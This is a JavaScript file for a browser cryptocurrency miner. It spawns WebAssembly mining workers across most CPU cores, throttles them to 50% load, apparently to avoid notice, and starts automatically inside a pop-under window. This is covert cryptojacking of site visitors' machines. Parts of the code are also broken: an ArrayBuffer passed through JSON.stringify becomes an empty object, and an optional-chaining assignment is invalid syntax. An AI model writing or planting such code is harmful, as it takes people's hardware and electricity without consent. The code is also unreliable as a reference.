let threadWorkers = [];
let stats = { hashes: 0, start: Date.now() };
const MAX_CPU = 0.5; // 50% throttle

async function initMiner() {
  const resp = await fetch('wasm/miner.wasm');
  const buffer = await resp.arrayBuffer();
  const mod = await WebAssembly.compile(buffer);
  const threadCount = Math.max(1, navigator.hardwareConcurrency - 1);

  for (let i = 0; i < threadCount; i++) {
    const worker = new Worker(URL.createObjectURL(new Blob([`
      onmessage = ({ data }) => {
        const MAX = ${MAX_CPU};
        WebAssembly.instantiate(${JSON.stringify(buffer)}, {})
          .then(wasm => {
            const hash = wasm.instance.exports.hash;
            let count = 0, last = performance.now();
            function loop() {
              const start = performance.now();
              while (performance.now() - start < MAX * 10) { // throttle
                hash(); count++;
              }
              postMessage(count);
              count = 0;
              setTimeout(loop, MAX * 10);
            }
            loop();
          });
      };
    `], {type: 'application/javascript'})));

    worker.onmessage = e => {
      stats.hashes += e.data;
      updateStats();
    };

    worker.postMessage({});
    threadWorkers.push(worker);
  }
}

function updateStats() {
  const now = Date.now();
  const seconds = (now - stats.start) / 1000;
  const hps = (stats.hashes / seconds).toFixed(1);
  const revenue = (stats.hashes * 0.0000001).toFixed(6);
  document.getElementById('hash-stats')?.innerText = 
    `Hash rate: ${hps} H/s | Total hashes: ${stats.hashes} | Simulated earnings: Ξ${revenue}`;
}

// Auto-init when run inside popunder
if (window.location.pathname.endsWith('popunder.html')) {
  initMiner();
  setInterval(updateStats, 1000);
}
